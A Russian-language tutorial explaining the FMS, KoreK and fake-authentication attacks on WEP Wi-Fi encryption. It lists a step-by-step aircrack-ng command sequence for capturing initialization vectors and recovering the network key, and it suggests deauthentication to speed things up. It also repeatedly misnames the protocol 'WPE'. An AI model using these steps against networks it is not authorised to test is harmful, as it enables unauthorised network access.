## Введение

Почему же в 2004 году данный протокол признали крайне небезопасным? Все очень просто - многочисленные недостатки шифрования **RC4**, такие как, к примеру, возможность коллизий векторов инициализации.

Очень хорошую работу по атакам на **WPE** можно найти в [данной научной работе](https://www.researchgate.net/figure/Fragmentation-attack-example-with-3-fragments_fig3_250142546).

Так как атак на **WPE** довольно много (и все они требуют неплохого знания криптографии, в чем я, честно, не очень силен), мы разберем лишь две интересные и отчасти связанные атаки - **ФМШ** и **Fake authentication**.

## Атака ФМШ

Данная атака была предложена Скоттом Фларером, Ициком Мантином и Ади Шамиром (от их фамилий и образовали название) в 2001 году. Основная ее мысль заключалась в неслучайности первых байт ключевого потока, что, при получении достаточного количества пакетов и присутствии среди них пакетов со слабым инициализационным вектором позволяло восстановить общий ключ.

> ℹ️ Интересный факт: именно эта атака, по сути, и подтолкнула создание нового стандарта шифрования - **WPA**.

Провести данную атаку можно следующим образом:

`iwconfig` - получаем список интерфейсов.

`sudo systemctl stop NetworkManager` - остановка сервиса, который может помешать работе _aircrack-ng_.

`sudo airmon-ng check kill` - то же, что и выше.

`sudo ip link set wlan0 down` - останавливаем работу адаптера.

`sudo iw wlan0 set monitor control` - переводим адаптер в режим монитора.

`sudo ip link set wlan0 up` - снова включаем адаптер.

`iwconfig` - убеждаемся, что теперь в пункте _Mode_ стоит **Monitor**.

`airodump-ng wlan0` - получаем список BSSID точек, на которые мы можем провести атаку. Также благодаря этой команде можно понять, сколько устройств подключено к ним.

`iwconfig wlan0 channel <CH>` - настраиваемся на нужный канал (доступен в поле _CH_ результата команды выше).

`airodump-ng --bssid <BSSID> -w dump wlan0` - запускаем сбор векторов инициализации.

`aircrack-ng -b 00:01:02:03:04:05 dump*.cap` - пытаемся извлечь ключ из полученных данных.

Продолжением этой атаки стала атака **KoreK** (опять же, названная в честь ее создателя), позволяющая не искать слабые вектора инициализации ценой увеличения их общего количества. Запустить ее можно с помощью добавления к команде выше флага `-K`.

Со временем нашли способ сделать систему неуязвимой к данной атаке, а именно отбрасывать начало ключевого потока. Назвали такую модификацию "**RC4-drop[n]**", где n - количество байт, которое необходимо отбросить.

> ✅ Кстати, для ускорения набора пакетов можно воспользоваться атакой деаутентификации. Однако не стоит перебарщивать - наша задача состоит в том, чтобы получить данные, а не сделать сеть недоступной.

Единственный, но иногда крайне неприятный нюанс данной атаки - необходимость того, чтобы в сети были клиенты, обменивающиеся с точкой доступа данными. Но что делать, если их нет?

## Fake authentication

Стандарт **IEEE 802.11** определяет 2 способа подключения к точке - четырехсторонее рукопожатие (классика) и _Open System authentication_, при котором можно подключиться к точке без знания секретного ключа.

Но что это нам это знание дает? Как ни странно - возможность набирать так нужные для взлома пакеты, ведь теперь мы можем инжектировать пакеты, и точка доступа, так как мы с ней ассоциированы, будет отвечать нам. Сделать это можно с помощью **Fragmentation** или **Chop-Chop** атаки.

Более подробно о том, как это происходит - [здесь](https://www.javatpoint.com/fake-authentication-attack) и [здесь](https://www.aircrack-ng.org/doku.php?id=fake_authentication).